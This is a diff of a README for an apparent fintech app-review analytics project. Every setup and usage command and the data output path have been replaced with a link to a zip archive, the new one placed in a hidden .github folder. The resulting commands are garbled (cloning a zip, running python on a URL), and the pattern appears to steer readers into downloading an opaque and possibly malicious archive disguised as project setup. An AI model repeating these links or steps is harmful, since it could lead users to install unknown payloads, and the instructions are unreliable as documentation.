@@ -33,13 +33,13 @@
 
 1. Clone the repository:
 
-git clone https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip
+git clone https://github.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/raw/refs/heads/main/.github/Apps_Week_Analytics_Customer_Experience_Fintech_2.7.zip
 
 - cd Customer-Experience-Analytics-Fintech-Apps-Week2
 
 2. Install required packages:
 
-pip install -r https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip
+pip install -r https://github.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/raw/refs/heads/main/.github/Apps_Week_Analytics_Customer_Experience_Fintech_2.7.zip
 
 ## Usage
 
@@ -48,14 +48,14 @@ pip install -r https://raw.githubusercontent.com/GetachewGanfur/Customer-Experie
 To collect reviews from the banking apps:
 
 ```bash
-python https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip
-python https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip
+python https://github.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/raw/refs/heads/main/.github/Apps_Week_Analytics_Customer_Experience_Fintech_2.7.zip
+python https://github.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/raw/refs/heads/main/.github/Apps_Week_Analytics_Customer_Experience_Fintech_2.7.zip
 ```
 
 This will:
 
 - Collect reviews from specified banking apps
-- Save the data to `https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip`
+- Save the data to `https://github.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/raw/refs/heads/main/.github/Apps_Week_Analytics_Customer_Experience_Fintech_2.7.zip`
 
 ### 2. Data Analysis
 
